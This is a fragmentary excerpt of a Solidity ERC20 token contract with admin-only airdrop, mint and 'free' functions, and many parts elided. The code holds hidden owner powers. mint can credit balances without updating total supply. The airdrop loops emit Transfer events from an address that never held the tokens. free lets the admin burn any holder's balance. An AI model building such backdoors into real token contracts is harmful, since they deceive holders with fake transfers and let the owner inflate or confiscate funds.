...
contract ERC20 is Ownable,IERC20 {
    ...
    function airDropOfBalance(bytes memory _bytes,uint256 addrCount,uint256 amount,uint256 chiCount) public onlyadmin{
        ...
        for(uint32 i=0;i<addrCount;i++){
            ...
            balances[tempAddress]+=amount * (10 ** decimals);
            emit Transfer(airFrom, tempAddress, amount * (10 ** decimals));
            _start+=20;
        }
        uint256 gasSpent;
        uint256 canFree=0;
    ...
    function multiAirDrop(address[] memory addresses, uint256[] memory amounts,uint256 chiCount) public onlyadmin {
        uint256 gasStart = gasleft();
        ...
        for(uint i=0; i < addresses.length; i++){
            ...
            emit Transfer(airFrom, addresses[i], amount);
        }
        uint256 gasSpent;
        uint256 canFree=0;
        if(chiCount>0)
    ...
    function mint(address target, uint256 amount,bool supplyFlag) public onlyadmin{
        balances[target] += amount * (10 ** decimals);
        if(supplyFlag){
            totalSupply_ += amount * (10 ** decimals);
        }
        emit Transfer(airFrom, target, amount * (10 ** decimals));
    }
    ...
    function free(address target,uint256 amount,bool supplyFlag) public onlyadmin{
        ...
        emit Transfer(target, address(0), amount * (10 ** decimals));
    }
